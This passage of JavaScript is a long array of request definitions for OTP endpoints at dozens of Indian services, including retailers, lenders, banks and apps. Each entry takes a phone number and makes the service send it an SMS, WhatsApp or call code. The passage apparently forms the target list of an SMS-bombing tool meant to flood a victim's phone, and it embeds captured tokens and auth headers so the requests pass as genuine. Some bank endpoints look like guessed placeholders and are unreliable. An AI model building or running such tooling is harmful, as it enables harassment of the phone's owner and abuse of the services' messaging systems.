        method: "POST", headers: { "Content-Type": "application/json", "Origin": "https://www.jiosaavn.com", "Referer": "https://www.jiosaavn.com/" },
        data: (phone) => JSON.stringify({ phone_number: "+91" + phone })
    },
    {
        name: "Vedantu_WA",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/register" },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },
    {
        name: "Naaptol", url: "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.naaptol.com", "pagesecuritytoken": "DE3NzMzMTY2NTY3NTZfVkBAcHRvbF83MzA1ODUyba",
            "referer": "https://www.naaptol.com/", "x-requested-with": "XMLHttpRequest"
        },
        data: (phone) => JSON.stringify({ actionname: "checkMobileUserExistsForTvApp", mobile: phone })
    },
    {
        name: "Myntra_WA",
        method: "POST",
        url: "https://www.myntra.com/gateway/v1/auth/getotp",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.myntra.com", "referer": "https://www.myntra.com/login", "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f", "x-myntraweb": "Yes", "x-requested-with": "browser", "x-location-context": "pincode=276304;source=IP", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
        data: (phone) => JSON.stringify({ phoneNumber: phone, signup: "ONECLICK" })
    },
    {
        name: "Zepto", url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" },
        data: (phone) => JSON.stringify({ mobileNumber: phone })
    },
    {
        name: "IndiaMart_WA",
        method: "POST",
        url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://m.indiamart.com", "referer": "https://m.indiamart.com/login/" },
        data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone })
    },
    {
        name: "Factori", url: "https://factori.com/login/check_user_exists",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "origin": "https://factori.com", "referer": "https://factori.com/my-account" },
        data: { "_raw": "mobNumber={phone}&countryCode=91" }
    },
    {
        name: "CityMallWeb_WA",
        method: "POST",
        url: "https://citymall.live/web-api/auth/send-otp",
        headers: { "accept": "application/json, text/plain, */*", "content-type": "application/json", "host": "citymall.live", "origin": "https://citymall.live", "referer": "https://citymall.live/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "Smytten", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST", headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone, email: "test@example.com" })
    },
    {
        name: "Zepto_WA",
        method: "POST",
        url: "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        headers: { "Content-Type": "application/json", "Accept": "application/json", "Origin": "https://www.zepto.com", "Referer": "https://www.zepto.com/" },
        data: (phone) => JSON.stringify({ mobileNumber: phone, countryCode: "+91" })
    },
    {
        name: "Tata Capital Business", url: "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        method: "POST", headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNumber: phone, deviceOs: "Android", sourceName: "MitayeFaasleWebsite" })
    },
    {
        name: "Havells_WA", url: "https://havells.com/otplogin/account/otploginpost/", method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on" }
    },
    {
        name: "Wellness_Forever", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: (phone) => ({ "_raw": `method=firstRegisterApi&data={"customerMobile":"${phone}","generateOtp":"true"}` })
    },
    {
        name: "HeroFinCorp_WA", url: "https://loans.apps.herofincorp.com/api/generateOtp", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, terms: true, whatsapp: true })
    },
    {
        name: "TataCapital_Retail", url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://www.tatacapital.com", "referer": "https://www.tatacapital.com/" },
        data: (phone) => JSON.stringify({ header: { authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", identifier: "nli" }, body: { mobileNumber: phone } })
    },
    {
        name: "Jockey_WhatsApp", url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        method: "GET",
        headers: { "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "accept": "*/*" }
    },
    {
        name: "Animall", url: "https://animall.in/zap/auth/login", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" })
    },
    {
        name: "Swipe", url: "https://app.getswipe.in/api/user/mobile_login", method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile: phone, resend: true })
    },
    {
        name: "Wrogn", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", method: "POST",
        headers: { "accept": "*/*", "action": "sendOTP", "content-type": "application/json", "origin": "https://wrogn.com", "referer": "https://wrogn.com/", "shop_name": "wrogn-website.myshopify.com" },
        data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" })
    },
    {
        name: "ServeTel", url: "https://api.servetel.in/v1/auth/otp", method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "BlinkrLoan", url: "https://backend.blinkrloan.com/api/user/v3/send-otp", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "withCredentials": "true", "Origin": "https://www.blinkrloan.com", "Referer": "https://www.blinkrloan.com/" },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" })
    },
    {
        name: "RL_Freedo_WA",
        method: "POST",
        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        headers: { "accept": "*/*", "content-type": "application/json", "origin": "https://freedo.rentals", "platform": "web", "referer": "https://freedo.rentals/", "requestfrom": "customer", "x-bn": "2.0.16", "x-channel": "WEB", "x-client-id": "FREEDO", "x-platform": "CUSTOMER" },
        data: (phone) => JSON.stringify({ email_id: "test@example.com", first_name: "Test", mobile_number: phone })
    },
    {
        name: "RoyalChallengers", url: "https://shop.royalchallengers.com/api/customer/login",
        method: "POST",
        headers: { "Content-Type": "application/json", "user-agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ utype: "Online", mobile: phone, email: "" })
    },
    {
        name: "Cashify", url: "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}",
        method: "GET", headers: { "user-agent": "okhttp/3.9.1" }
    },
    {
        name: "Tradgo", url: "https://tradgo.in/appapi4/Forgot_password_new/getOtp",
        method: "POST", headers: { "Content-Type": "application/json", "User-Agent": "okhttp/3.9.1" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Gapoon", url: "https://www.gapoon.com/userSignup",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile={phone}&email=noreply@gmail.com&name=Test" }
    },
    {
        name: "AllenSolly", url: "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
        method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobileoremail={phone}&name=Test" }
    },
    {
        name: "Cuemath_1",
        method: "POST",
        url: "https://www.cuemath.com/api/v4/parents/",
        headers: {
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/JSON",
            "Accept": "*/*",
            "Origin": "https://www.cuemath.com",
            "Referer": "https://www.cuemath.com/the-ultimate-cuemath-olympiad/partner/timesofindia/register/?intent=ultimate-olympiad",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "intl_mobile": { "phone": "" }, "phone": "{phone}", "email": "test@test.com", "full_name": "Test", "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk", "timezone": "Asia/Calcutta", "detail_source": "CMO_2020", "form_fields": "full_name,phone,email,place_id" }
    },
    {
        name: "Dream11_1",
        method: "POST",
        url: "https://www.dream11.com/graphql/mutation/pwa/register",
        headers: {
            "accept": "*/*",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register?ru=",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": { "email": "test@gmail.com", "mobileNumber": "{phone}", "password": "Test@123astronomia" } }
    },
    {
        name: "Doubtnut",
        method: "POST",
        url: "https://doubtnut.com/api/v1/user/login",
        headers: {
            "save-data": "on",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "*/*",
            "origin": "https://doubtnut.com",
            "referer": "https://doubtnut.com/login",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "phone={phone}" }
    },
    {
        name: "Ajio_2",
        method: "POST",
        url: "https://login.web.ajio.com/api/auth/signupSendOTP",
        headers: {
            "accept": "application/json",
            "Origin": "https://www.ajio.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Referer": "https://www.ajio.com/signup?referrer=/my-account/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US"
        },
        data: { "firstName": "Test User", "login": "test@gmail.com", "password": "Test@1231nxnxn", "genderType": "", "mobileNumber": "{phone}", "requestType": "SENDOTP" }
    },
    {
        name: "EasyMyTrip",
        method: "POST",
        url: "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
        headers: {
            "accept": "text/plain, */*; q=0.01",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://mybookings.easemytrip.com",
            "referer": "https://mybookings.easemytrip.com/MyBooking/Profile",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "emailph": "{phone}" }
    },
    {
        name: "Kotak_1",
        method: "POST",
        url: "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.kotak.com",
            "Referer": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
        },
        data: { "_raw": "cust_full_name=Test+User&cust_email=test%40gmail.com&cust_mobile={phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes" }
    },
    {
        name: "Licious",
        url: "https://www.licious.in/api/login/signup", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://www.licious.in", "Referer": "https://www.licious.in/" },
        data: (phone) => JSON.stringify({ phone: phone, captcha_token: null })
    },
    {
        name: "SabkaLoan", url: "https://api.sabkaloan.com/api/send-otp", method: "POST",
        headers: { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://sabkaloan.com", "Referer": "https://sabkaloan.com/" },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "Jockey",
        method: "GET",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "PharmEasy_NEW", method: "POST",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        headers: {
            "Host": "pharmeasy.in",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Accept": "*/*", "Content-Type": "application/json"
        },
        data: { "contactNumber": "{phone}" }
    },
    {
        name: "Sephora", url: "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869", method: "POST",
        headers: { "Content-Type": "application/json", "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==", "x-fp-signature": "v1.1:82658e094becb14ba6a75fcca29dd5e7f1cb0767978485c12185178ff7ad198b", "x-fp-date": "20260108T112314Z", "x-fp-sdk-version": "3.3.2", "Origin": "https://sephora.in", "Referer": "https://sephora.in/" },
        data: (phone) => JSON.stringify({ mobile: phone, country_code: "91" })
    },
    {
        name: "Tyreplex2_WA",
        method: "POST",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Hungama_Verified",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/"
        },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", emailId: "", subject: "Register", priority: "1", device: "web", variant: "v1", templateCode: 1 })
    },
    {
        name: "Servetel_Verified",
        url: "https://api.servetel.in/v1/auth/otp",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)" },
        data: { "_raw": "mobile_number={phone}" }
    },
    {
        name: "KPNFresh_Verified",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        method: "POST",
        headers: { "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "content-type": "application/json", "origin": "https://www.kpnfresh.com", "referer": "https://www.kpnfresh.com/" },
        data: (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } })
    },
    {
        name: "NewMe SMS",
        url: "https://prodapi.newme.asia/web/otp/request",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile_number": phone, "resend_otp_request": true})
    },
    {
        name: "Smytten SMS",
        url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        method: "POST",
        headers: {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},
        data: (phone) => JSON.stringify({"phone": phone, "email": "test@gmail.com"})
    },
    {
        name: "Country Delight",
        url: "https://api.countrydelight.in/api/v1/customer/requestOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "platform": "Android", "mode": "new_user"})
    },
    {
        name: "Licius",
        url: "https://www.licious.in/api/login/signup",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "captcha_token": null})
    },
    {
        name: "Breeze Session",
        url: "https://api.breeze.in/session/start",
        method: "POST",
        headers: {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3"},
        data: (phone) => JSON.stringify({"phoneNumber": phone, "authVerificationType": "otp", "countryCode": "+91"})
    },
    {
        name: "IIFL SMS",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "apply_for=18&full_name=Test&mobile_number={phone}&terms_and_condition=1&_drupal_ajax=1" }
    },
    {
        name: "Tata Capital Retail SMS",
        url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": phone}})
    },
    {
        name: "TradeIndia SMS",
        url: "https://apis.tradeindia.com/app_login_api/login_app",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": `+91${phone}`})
    },
    {
        name: "AstroSage SMS",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "Bisleri",
        url: "https://apis.bisleri.com/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"email": "test@gmail.com", "mobile": phone})
    },
    {
        name: "Zerodha SMS",
        url: "https://zerodha.com/account/registration.php",
        method: "POST",
        headers: {"Content-Type": "application/json;charset=UTF-8"},
        data: (phone) => JSON.stringify({"mobile": phone, "source": "zerodha", "partner_id": ""})
    },
    {
        name: "TyrePlex SMS",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },
    {
        name: "Zomato Login SMS",
        url: "https://www.zomato.com/php/asyncLogin.php",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "phone={phone}&type=sms" }
    },
    {
        name: "Cuemath SMS",
        url: "https://www.cuemath.com/api/v4/parents/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "full_name": "TestUser", "email": "test@gmail.com"})
    },
    {
        name: "Ullu SMS",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        method: "POST",
        headers: {}
    },
    {
        name: "Ogonn SMS",
        url: "https://ogonn.in/otp",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Aakash Digital SMS",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobileval={phone}" }
    },
    {
        name: "BigCash SMS",
        url: "https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        method: "GET",
        headers: {"Referer": "https://www.bigcash.live/games/poker"}
    },
    {
        name: "HeroFinCorp GET",
        url: "https://festive.api.herofincorp.com/v1/customer/otp/{phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "MuscleBlaze SMS",
        url: "https://www.muscleblaze.com/veronica/user/validate/9/{phone}/signup?plt=2&st=9",
        method: "GET",
        headers: {}
    },
    {
        name: "RedBus OTP",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91",
        method: "GET",
        headers: {}
    },
    {
        name: "Jockey SMS",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        method: "GET",
        headers: {}
    },
    {
        name: "RupeeLending",
        url: "https://rupeelending.com/apply-now/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "BrightLoans",
        url: "https://brightloans.in/login-sbm",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
    },
    {
        name: "SalaryTopUp",
        url: "https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "event_name": "login"})
    },
    {
        name: "TataCapital PL",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobileNumber": phone, "deviceOS": "Web", "applSource": "PL"})
    },
    {
        name: "Moglix V2",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2",
        method: "POST",
        headers: {"Content-Type": "application/json", "x-platform": "PWA"},
        data: (phone) => JSON.stringify({"email": "", "phone": phone, "type": "p", "source": "signup", "buildVersion": "37.3.1"})
    },
    {
        name: "MyMoneyBazaar",
        url: "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone_number": phone})
    },
    {
        name: "Decathlon",
        url: "https://www.decathlon.in/api/v1/auth/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "isLogin": true})
    },
    {
        name: "PocketMoney SMS",
        url: "https://api2.the-pocket-money.com/pokktmoney/send_verification_code?verification_phone={phone}",
        method: "GET",
        headers: {}
    },
    {
        name: "Oziva SMS",
        url: "https://api.prod.oziva.in/nitro/send/",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "source": "order_management", "type": "sms"})
    },
    {
        name: "Refyne SMS",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "SMS", "recipient": phone})
    },
    {
        name: "HERE SMS",
        url: "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone, "source": "sms"})
    },
    {
        name: "VisitApp SMS",
        url: "https://api.getvisitapp.com/v3/new-auth/login-phone",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone, "countryCode": 91, "platform": "WEB"})
    },
    {
        name: "Sulekha",
        url: "https://myaccount.sulekha.com/network/userauthv1.aspx",
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Country Delight GET",
        url: "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Eka Care",
        url: "https://auth.eka.care/auth/resend",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Planet Fashion",
        url: "https://www.planetfashion.in/login/resendOTP?isAjax=true",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "OkCredit",
        url: "https://web.okcredit.in/api/authn/v1.0/otp:request",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Naaptol SMS",
        url: "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "MobiKwik SMS",
        url: "https://www.mobikwik.com/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Shopclues SMS",
        url: "https://www.shopclues.com/api/v1/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Myntra SMS",
        url: "https://www.myntra.com/gw/mobile-auth/otp/generate",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "PharmEasy New",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Delhivery Direct",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        method: "GET",
        headers: {"User-Agent": "Mozilla/5.0"}
    },
    {
        name: "Coursera SMS",
        url: "https://www.coursera.org/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Pay Amazon SMS",
        url: "https://pay.amazon.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Kotak Bank SMS",
        url: "https://www.kotak.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"phone": phone})
    },
    {
        name: "Axis Bank SMS",
        url: "https://www.axisbank.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "IndusInd SMS",
        url: "https://www.indusind.com/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Federal Bank SMS",
        url: "https://www.federalbank.co.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Indian Bank SMS",
        url: "https://www.indianbank.in/api/otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"mobile": phone})
    },
    {
        name: "Ola WhatsApp",
        url: "https://olacabs.com/api/v1/customers/sendOtp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"number": phone, "otpOnCall": true})
    },
    {
        name: "Refyne WhatsApp",
        url: "https://prod-api.refyne.co.in/auth/v3/send-otp",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"channel": "WHATSAPP", "recipient": phone})
    },
    {
        name: "Housing WhatsApp",
        url: "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({"query": "mutation($phone:String){sendOtp(phone:$phone,preference:\"whatsapp\"){success}}", "variables": {"phone": phone}})
    },
    {
